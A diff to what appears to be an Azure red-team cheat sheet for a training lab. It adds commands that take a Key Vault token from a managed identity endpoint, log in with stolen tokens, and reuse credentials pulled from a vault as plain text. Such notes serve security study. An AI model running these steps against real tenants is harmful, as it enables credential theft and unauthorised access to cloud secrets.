@@ -1379,6 +1379,19 @@ cat C:\Users\<USER>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Cons
 ```
 
 ## Keyvault
+#### Get keyvault access token
+```
+curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
+```
+
+### Login to account with access tokens for keyvault
+```
+$accesstoken = ''
+$keyvaulttoken = ``
+
+Connect-AzAccount -AccessToken $accesstoken -AccountId 2e91a4fe-a0f2-46ee-8214-fa2ff6aa9abc -KeyVaultAccessToken $keyvaulttoken
+```
+
 #### List all keyvaults
 ```
 Get-AzKeyVault
@@ -1399,15 +1412,14 @@ Get-AzKeyVaultSecret -VaultName ResearchKeyVault -AsPlainText
 Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText
 ```
 
-####
+#### Connect with the credentials found and enumerate further!
+```
+$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('kathynschaefer@defcorphq.onmicrosoft.com', $password)
+
+Connect-AzAccount -Credential $creds
 ```
 
-```
-
-####
-```
-
-```
 # Lateral movement
 ####
 ```
